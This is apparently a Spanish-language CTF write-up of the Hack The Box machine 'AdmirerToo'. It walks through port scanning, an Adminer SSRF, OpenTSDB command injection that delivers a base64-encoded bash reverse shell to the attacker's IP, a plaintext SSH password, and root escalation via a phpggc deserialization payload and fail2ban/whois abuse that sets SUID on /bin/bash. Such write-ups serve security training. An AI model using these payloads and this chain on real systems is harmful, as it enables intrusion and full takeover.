---
layout: post
author: Sergio Salgado
---

## [](#header-2)Indice
Primero utilizaremos la herramienta que hace la identificación de conexión silenciosa y reconocimiento del sistema al que nos presentamos, su IP es `10.10.11.137`

![scan 1](/assets/images/AdmirerToo/reconocimiento1.png)

El primer escaneo rápido con nmap, para poder agilizar mientras más búsquedas o búsqueda de vulnerabilidades sobre esos puertos.

```s
nmap -p- --open -sS --min-rate 5000 -vvv 10.10.11.137
```

![nmap 1](/assets/images/AdmirerToo/nmap1.png)

El segundo escaneo, ya un poco más profundo será:

```s
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.137 -oG allPorts
```

![nmap 2](/assets/images/AdmirerToo/nmap2.png)

Después de tener los puertos, se puede hacer un escaneo ahora directo a los puertos con:

```s
nmap -sCV -p22,80 10.10.11.137 -oN targeted
```
![nmap 3](/assets/images/AdmirerToo/nmap3.png)

Proseguiremos a usar mas herramientas como WHATWEB, para listar las tecnologias que se estan usando, WFUZZ para listar posibles directorios

```s
whatweb http://10.10.11.137
```

![whatweb](/assets/images/AdmirerToo/whatweb.png)

Con el siguiente comando, analizaremos 2 tipos de directorios, junto con extensiones en lista de html, php y txt, el comando -L nos redirige al codigo 200 para que no muestre solamente el codigo 302 por ejemplo.

```s
wfuzz -c -L --hc=404 -t 200 -w /usr/share/wordlists/wfuzz/webservices/directory-list-2.3-medium.txt -z list,html-php-txt http://10.10.11.137/FUZZ.FUZ2Z
```

![wfuzz](/assets/images/AdmirerToo/wfuzz.png)

Ahora que sabemos que hay un dominio llamado admirer-gallery.htb, lo incorporaremos a nuestro /etc/hosts para enumerar mas informacion.

Para este paso, usaremos gobuster, con el comando:

```s
gobuster vhost -u "http://admirer-gallery.htb" -w /usr/share/wordlists/wfuzz/webservices/subdomains-top1million-5000.txt -t 200
```

![gobuster](/assets/images/AdmirerToo/gobuster.png)

En este paso hemos encontrado un dominio que al parecer es una interfaz para acceder a la base de datos y tambien lo meteremos en nuestro archivo /etc/hosts. Y procederemos a ver la pagina, esto es lo que nos aparece:

![DB admirer login](/assets/images/AdmirerToo/db.admirer.png)

Al parecer no necesitamos ingresar credenciales, pero podemos obtener la cookie de admin con Burpsuite para seguir haciendo cosas que se nos impidan.

![DB admirer loged](/assets/images/AdmirerToo/db_logged.png)

Para obtener las credenciales, daremos click en logout y despues activamos en burpsuite el intercept para poder dar click en enter y poder mandar la solicitud a burp. Tenemos en el pie de la pagina una URL que podemos seleccionar y con un CTRL+SHIFT+U nos lo decodeara, o simplemente lo mandamos a la seccion de decoder como yo lo hice:

![URL decode](/assets/images/AdmirerToo/url_decode.png)

Dentro de esta pagina, tambien vemos que podemos insertar nuestros propios comandos de SQL.
Procedemos a las pruebas de SQLI
```sql
--Para leer algun archivo dentro de la maquian
select load_file("/etc/passwd")
--Para ver la version o tipo de sql que esta corriendo
select version()
--Para ver la base de datos que se esta usando
select database()

select user()
--Para ver nuestros privilegios
show grants;
```
Con esto no logramos mucho, pero al buscar mas sobre el servicio de sql, vemos que se menciona mucho que es vulnerable al SSRF.

Ahora que investigamos mas, encontramos un documento que explica esta vulnerabilidad y la usaremos para explotar las peticiones a la misma maquina, con la <a href="https://gist.githubusercontent.com/bpsizemore/227141941c5075d96a34e375c63ae3bd/raw/0f5e8968a3490190d72ccefd40f9c6b693918d71/redirect.py">herramienta</a> de github para automatizar el SSRF. Y la descargaremos en nuestro directorio de exploits/. Para mas informacion de la herramienta y explotacion, esta el link de descarga en este <a href="https://github.com/vrana/adminer/files/5957311/Adminer.SSRF.pdf">enlace</a>

En el documento, el primer paso que vemos es modificar el request que le hacemos al servicio, ya que los campos que se muestran en la interfaz no son exactamente los que pide el exploit, pero internamente se encuentra escritos. La modificacion, sera de la siguiente forma con burpsuite:
 -En server, va elastic
 -En auth server va tu IP

![SSRF Request](/assets/images/AdmirerToo/req_ssrf.png)

Ya que sabemos que podemos hacer peticiones de URL a traves de este medio, nos convendria hacer un 4to escaneo de nmap para listar los puertos que estan cerrados para nosotros, pero quizas para la maquina no lo esten.

```s
sudo nmap -p- -sS --min-rate 5000 -vvv -n -Pn 10.10.11.137
```

![nmap 4](/assets/images/AdmirerToo/nmap4.png)

El puerto 4242 esta abierto, el title dice OpenTSDB que es un producto LGPL para recopilar metricas de firewall y demas servicios, el cual tiene exploits quizas; asi que abusaremos de el ya que desde este lado si tenemos acceso.

El enlace que usaremos para ejecutar servicios se encuentra en <a href="https://github.com/OpenTSDB/opentsdb/issues/2051">github</a>

Ahora haemos unas pruebas con esto que tenemos, intentaremos mandar un ping a nuestra maquina y esperaremos su traza, con lo siguiente:

- Primero Listaremos metricas en el OpenTSDB, para que sirva bien el url

```s
sudo python2 redirect.py -p 80 "http://localhost:4242/api/suggest?type=metrics&q=&max=50"
```

![Metrics](/assets/images/AdmirerToo/metrics.png)

La respuesta, nos da un `http.stats.web.hits`

 -Comando con el exploit, borraremos `sys.cpu.nice` y lo cambiaremos por `http.stats.web.hits`

 ```s
sudo python2 redirect.py -p 80 "http://localhost:4242/q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:http.stats.web.hits&o=&ylabel=&xrange=10:10&yrange=[33:system('ping%2B-c%2B2%2B10.10.14.230')]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json"
#El comando debera estar en formato URL, por eso en este caso para los espacios se agregaron los '+'
```

 -Comando para recibir el ping

```s
sudo tcpdump -i tun0 icmp -n
```

![Ping request test](/assets/images/AdmirerToo/ping_test.png)

Como mi internet no es el mejor, tuve que esperar un poco para recibir la respuesta, y con lo siguiente supongo que sera lo mismo, asi que hay que tener paciencia.

Script de reverse shell en base64 para insertar en la url:

```s
echo "bash -c 'bash -i >& /dev/tcp/10.10.14.230/4444 0>&1'" | base64
```

Para ejecutar en el mismo comando, el script codificado, insertaremos:

```s
#echo+BASE64CODE|base64+-d|bash
#Para sustituir algunos caracteres se puede usar el comando
man ascii
#echo+YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMzAvNDQ0NCAwPiYxJwo=|base64+-d|bash
sudo python2 redirect.py -p 80 "http://localhost:4242/q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:http.stats.web.hits&o=&ylabel=&xrange=10:10&yrange=[33:system('echo+YmFzaCAtYyAnYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC4yMzAvNDQ0NCAwPiYxJwo=|base64+-d|bash')]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json"
```

![Reverse shell](/assets/images/AdmirerToo/reverse_shell.png)

Hasta este punto aun no podemos visualizar la flag, tenemos que convertirnos en Jennifer y para hacerlo podemos ir revisando archivos. Pero en especial la contrasena se encuentra duplicada para un usuario de base de datos en /var/www/adminer/plugins/data/servers.php. Una vez que tenemos la contrasena, podemos leer la flag y establecer una coneccion por ssh directamente con el usuario jennifer.

![Password & Connection](/assets/images/AdmirerToo/pass%26ssh.png)

Ahora tendremos que escalar los privilegios. Sabemos que la maquina es Debian Buster, para entrar podemos ir comenzando listando privilegios con:

```s
find \-perm -4000 2>/dev/null
cat /etc/crontab
netstat -nat
#Con el comando anterior descubrimos que existe un servicio en el puerto 8080 que no salia #anteriormente en nuestro escaneo. Asi que procederemos a hacer:
```

Les adelanto que el servicio anteriormente visto, es vulnerable pero no nos permitira ganar los permisos de root. 

Lo que se puede hacer es que en la ruta /var/log hay una aplicacion llamada fail2ban que se enfoca en cortar o banear las conecciones de los atacantes que se intentan meter por fuerza bruta, hace rato mientras hacia lo del OpenSDB me empezaron a salir comentarios extranos de que habia muchas peticiones y ya no se me ejecutaba nada, asi que mande un reset a la maquina e inmediatamente pude ejecutar mi reverse shell.

De acuerdo a la informacion de esta <a href="https://research.securitum.com/fail2ban-remote-code-execution/">pagina</a>, podemos tener acceso remoto a la maquina, esto como quizas algun usuario que tenga permisos para escribir en lugares que tengan permisos como root y despues poder usar a otro usuario o proceso para ejecutar nuestro codigo maligno.

Para saber mas sobre lo que esta pasando por detras, podemos usar un:

```s
strace whois 127.0.0.1
```
Para poder ver el servicio de OpenCats, sera necesario hacer un port Forwarding con ssh, como lo hice fue de la siguiente manera:

```s
sshpass -p 'bQ3u7^AxzcB7qAsxE3' ssh jennifer@10.10.11.137 -L 8081:localhost:8080 -L 16030:localhost:16030 -L 2181:localhost:2181 -L 16010:localhost:16010 -L 16020:localhost:16020
```

Y ahora ya estara disponible en la ruta `http://localhost:8081`

![Open Cats](/assets/images/AdmirerToo/open_cats.png)

Ahora, como el documento de exploit de opencat nos dice que en la url hay que hacer la serializacion de php en el url, podemos usar la herramienta <a href="https://github.com/ambionics/phpggc">phpggc</a>.
Ahora que sabemos que el comando whois se ejecuta con permisos de root, me genere un archivo con el nombre whois.conf que contiene [mi ip] [mi ip] y ejecute el siguiente comando para obtener la cadena que insertare en el URL.

```s
sudo ./phpggc -u --fast-destruct Guzzle/FW1 /usr/local/etc/whois.conf ../whois.conf
```

![Php payload](/assets/images/AdmirerToo/php_payload.png)

Y ahora que lo hemos insertado en el URL despues de DataGrid=, veremos si se ha escrito en el lugar que queriamos.

![Whois File](/assets/images/AdmirerToo/whois_file.png)

La prueba es correcta, ahora para jugar con el buffer y que no tome en cuenta lo demas, usaremos un script en python para editar el archivo de .conf, volver a pasarlo por phpggc y mandarlo de nuevo

```s
python3 -c 'print("]*10.10.14.230 10.10.14.230" + " "*500)' > whois.conf
```

Y quedaria ahora de la siguiente manera:

![.conf](/assets/images/AdmirerToo/conf_last.png)

Ahora podemos volver a nuestra maquina para esperar en la escucha en nc y pasarle un archivo que nombramos pwned que contiene lo siguiente:

```s
okjjks jafbsaf  sjfbKJSF
~! chmod u+s /bin/bash
```
Esto nos permitira darle los permisos necesarios a nuestra ip para que al conectarse pueda ejecutar comandos de root. Solo tenemos que abusar de la intruicion con ssh, para que se nos bloquee el acceso un rato y cuando pase el baneo, poder establecer la coneccion de nuevo.

Una vez establecida la conexion, bastara con ejecutar un:

```s
sshpass -p 'bQ3u7^AxzcB7qAsxE3' ssh jennifer@10.10.11.137

ls -l /bin/bash
bash -p
```

![Last reverse](/assets/images/AdmirerToo/reverse_final.png)


![POWNED](/assets/images/AdmirerToo/powned.png)